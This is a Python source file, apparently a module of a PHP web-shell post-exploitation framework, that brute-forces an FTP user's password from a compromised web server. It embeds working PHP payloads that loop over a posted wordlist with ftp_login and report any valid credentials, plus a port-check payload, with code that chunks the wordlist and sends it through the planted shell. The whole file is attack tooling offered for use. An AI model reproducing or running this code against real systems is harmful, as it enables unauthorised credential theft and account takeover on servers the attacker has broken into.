'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from random import choice
from math import ceil
from core.parameters import ParametersList, Parameter as P

classname = 'Ftp'
 


def chunks(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]
    
 
class Ftp(Module):
    '''Bruteforce ftp user'''
    
    vectors = VectorList([
            Vector('shell.php', 'brute_ftp_php', [ """$h="%s"; $p="%s"; $u="%s"; $w=$_POST["%s"]; 
foreach(split('[\n]+',$w) as $pwd) {
$c=@ftp_connect("$h", "$p");
if($c){
$l=@ftp_login($c,"$u","$pwd");
if($l) {
print("+" . $u . ":" . $pwd . "\n");
break;
}
}
ftp_close($c);
}
""", """$h="%s"; $p="%s"; $c=@ftp_connect($h, $p); if($c) { print(1); }; ftp_close($c);"""])
            ])

    
    params = ParametersList('Bruteforce single ftp user using local wordlist', vectors,
            P(arg='user', help='User to bruteforce', required=True, pos=0),
            P(arg='lpath', help='Path of local wordlist', required=True, pos=1),
            P(arg='sline', help='Start line of local wordlist', default='all', pos=2),
            P(arg='host', help='FTP host', default='127.0.0.1', pos=3),
            P(arg='port', help='FTP port', default=21, type=int, pos=4))



    def __init__( self, modhandler , url, password):
        
        self.chunksize = 50
        self.substitutive_wl = []
        Module.__init__(self, modhandler, url, password)
        
        
    def set_substitutive_wl(self, substitutive_wl=[]):
        """Cleaned after use"""
        self.substitutive_wl = substitutive_wl
        
                
    def run_module( self, user, filename, start_line, host, port, substitutive_wl = []):

        if start_line == 'all':
            start_line = 0

        if host not in ('localhost', '127.0.0.1'):
            self.chunksize = 20

        if self.substitutive_wl:
            wl_splitted = self.substitutive_wl[:]
            self.substitutive_wl=[]
        else:
            
            try:
                wordlist = open(filename, 'r')
            except Exception, e:
                raise ModuleException(self.name, "%s" % (str(e)))
    
            wl_splitted = [ w.strip() for w in wordlist.read().split() ]


        rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector, [host, port, user, rand_post_name, start_line, wl_splitted])
            if response != None:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return response
                
        
    def __execute_payload(self, vector, parameters):
        
        host = parameters[0]
        port = parameters[1]
        user = parameters[2]
        
        rand_post_name = parameters[3]
        start_line = int(parameters[4])
        
        # Check if port open using second payload
        
        payload_check = self.__prepare_payload(vector, [host, port], 1) 
        response_check = self.modhandler.load(vector.interpreter).run({0: payload_check})
        if response_check != '1':
            self.mprint('[%s] Error: service not available on \'%s:%i\'' % (self.name, host, port))
        else:
                
            wl = parameters[5][start_line:]
            wl_length = len(wl)
            
            if wl_length > self.chunksize:
                wl_chunks = chunks(wl, self.chunksize)
                self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words' % (self.name, wl_length, len(wl_chunks), len(wl_chunks[0])))
            else:
                wl_chunks = [ wl ] 
                self.mprint('[%s] Using wordlist of %i words' % (self.name, wl_length))
            
            i=0
            for wl in wl_chunks:
                        
                joined_wl='\n'.join(wl)
                    
                payload = self.__prepare_payload(vector, parameters[:-2]) 
                
                if vector.interpreter == 'shell.php':
                    self.modhandler.load(vector.interpreter).set_post_data({rand_post_name : joined_wl})
                response = self.modhandler.load(vector.interpreter).run({ 0 : payload})
                
                
                if response:
                    if response.startswith('+'):
                        return "[%s] FOUND! (%s)" % (self.name,response[1:])
                else:
                    self.mprint("Tried password #%i: (%s:%s) ..." % (i*len(wl), parameters[2], wl[-1]))
    
                i+=1
    
            self.mprint('[%s] Password of \'%s\' not found. Check ftp connection or try with another username and wordlist' % (self.name, parameters[2]));


    def __prepare_payload( self, vector, parameters, payloadnum = 0 ):
        
        if vector.payloads[payloadnum].count( '%s' ) == len(parameters):
            return vector.payloads[payloadnum] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    